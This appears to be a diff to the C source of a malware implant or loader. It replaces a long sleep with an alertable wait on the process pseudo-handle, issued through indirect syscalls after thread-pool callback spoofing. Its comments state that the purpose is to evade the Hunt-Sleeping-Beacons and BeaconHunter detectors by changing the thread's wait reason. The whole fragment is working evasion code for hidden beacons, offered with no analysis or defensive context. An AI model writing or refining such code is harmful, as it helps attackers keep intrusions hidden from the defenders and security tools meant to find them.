@@ -253,14 +253,18 @@ int Main(VOID) {
     // Post work — triggers SpoofCallback on a thread pool thread
     pTpPostWork(pWork);
 
-    // Keep process alive with infinite delay (indirect syscall)
-    LARGE_INTEGER li;
-    li.QuadPart = -315360000000000LL; // ~1 year in 100ns units
+    // Keep process alive via alertable wait on NtCurrentProcess pseudo-handle.
+    // Alertable=TRUE → thread WaitReason = UserRequest (not DelayExecution),
+    // avoiding Hunt-Sleeping-Beacons / BeaconHunter thread-state fingerprints.
+    // The pseudo-handle (-1) never signals in our own context, so the wait
+    // blocks indefinitely; a stray APC would just loop us back into wait.
     while (TRUE) {
-        SET_SYSCALL(NtApis.NtDelayExecution);
+        SET_SYSCALL(NtApis.NtWaitForSingleObject);
         RunSyscall(
-            (ULONG_PTR)FALSE, (ULONG_PTR)&li,
-            0, 0, 0, 0, 0, 0, 0, 0, 0, 0
+            (ULONG_PTR)(HANDLE)-1,  // NtCurrentProcess()
+            (ULONG_PTR)TRUE,        // Alertable
+            (ULONG_PTR)NULL,        // Infinite timeout
+            0, 0, 0, 0, 0, 0, 0, 0, 0
         );
     }
 
